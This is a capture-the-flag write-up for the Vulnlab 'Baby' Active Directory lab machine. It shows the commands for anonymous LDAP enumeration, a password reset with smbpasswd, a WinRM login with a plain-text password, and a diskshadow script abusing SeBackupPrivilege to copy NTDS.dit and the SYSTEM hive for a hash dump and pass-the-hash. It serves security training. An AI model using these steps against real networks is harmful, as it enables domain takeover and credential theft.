# Vulnlab - Baby

## NMAP

```bash
Nmap scan report for 10.10.83.40     
Host is up (0.081s latency).                
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  domain     Simple DNS Plus
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped     
389/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
3268/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-16T16:00:59
| Not valid after:  2023-12-16T16:00:59
| MD5:   55aa85b5f2fd316af5fbb1c8ad357d53
|_SHA-1: ae0ab02e5de2d54a9180931ff745d5a00deb41a2
|_ssl-date: 2023-06-17T16:09:48+00:00; +24s from scanner time.
5985/tcp  open  tcpwrapped
49664/tcp open  tcpwrapped
60083/tcp open  tcpwrapped
65331/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
```

## PORT 445 (SMB)

Enumerating smb shares with anonymous user it doesn't allow us to either list or read shares being unauthenticated

<img src="https://i.imgur.com/eYIUk4w.png"/>
We can move on to ldap which is running on port 389

## PORT 389 (LDAP)

On checking ldap with null authentication

```bash
ldapsearch -x -H ldap://10.10.83.40 -D '' -w '' -b "DC=baby,DC=vl"
```

This starts to return us usernames 

<img src="https://i.imgur.com/isY45pH.png"/>

We can use grep to filter for usernames

```bash
ldapsearch -x -H ldap://10.10.83.40 -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName | awk -F: '{ print $2 }' |  awk '{ gsub(/ /,""); print }'
```

<img src="https://i.imgur.com/spQzXI1.png"/>
With `kerbrute` we can verify domain users which also perform AS-REP roasting but here it didn't found any domain user with pre-authentication disabled

<img src="https://i.imgur.com/YfypfOu.png"/>

We can grep for user descriptions where on `Teresa.Bell` 's password was found from it's description

<img src="https://i.imgur.com/WMFF3HJ.png"/>

But using this password for Teresa failed as this password doesn't belong to her

<img src="https://i.imgur.com/QUSMgC3.png"/>

Spraying this password across the domain didn't worked as well

<img src="https://i.imgur.com/iznIIgx.png"/>

## Foothold (Connor.Wilkinson)

So going back to ldap, there was a user`Caroline.Robinson` which didn't had any attributes thus didn't get covered when it was getting filtered with `sAMAccountName` 

<img src="https://i.imgur.com/bDojsRM.png"/>

For this username the password is valid but it needs to be changed

<img src="https://i.imgur.com/PzhDxh5.png"/>
We can change her password by using impacket's `smbpasswd` by referring to this article

https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/

```bash
smbpasswd -U Caroline.Robinson -r 10.10.83.40
```

<img src="https://i.imgur.com/fttEduI.png"/>

We can try authenticating on WinRM to see if this user is in remote desktop group

<img src="https://i.imgur.com/kTADncK.png"/>

It shows Pwn3d! status which means we can login through WinRM

```bash
evil-winrm -i 10.10.83.40 -u 'Caroline.Robinson' -p 'BabyStart12345$Abc#!'
```

<img src="https://i.imgur.com/rgJR7uU.png"/>

Checking the privileges of this account with `whoami /all` we have `SeBackupPrivilege` privilege

<img src="https://i.imgur.com/JOAVqu3.png"/>


>Caroline's password will keep getting revert back as there was a script running, so you'll need to change the password again

## Privilege Escalation (Administrator)

Following this article to abuse `SeBackupPrivilege`

https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

Create a `dsh` script file and convert it to dos format with `unix2dos`

```bash
set context persistent nowriters
add volume c: alias owo
create
expose %owo% z:
```

<img src="https://i.imgur.com/5jeZKcC.png"/>

Now with `robocop`, copying `NTDS.dit` file in current directory

<img src="https://i.imgur.com/28xvP0k.png"/>

<img src="https://i.imgur.com/yIB1HM8.png"/>

Downloading the file on to our kali machine

<img src="https://i.imgur.com/1oEKuMr.png"/>

After downloading the file we'll have ntds.dit

<img src="https://i.imgur.com/S2EiIxv.png"/>

We'll also need `SYSTEM` file

```powershell
reg save hklm\system C:\Windows\Temp\system
```

<img src="https://i.imgur.com/Ax68SRu.png"/>

Having this file, we'll be able to parse through NTDS.dit file to dump hashes and get the administrator's hash

<img src="https://i.imgur.com/Xcp2BMe.png"/>

Now with `pass the hash` we'll be able to login as administrator

<img src="https://i.imgur.com/D1c5czy.png"/>

## References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
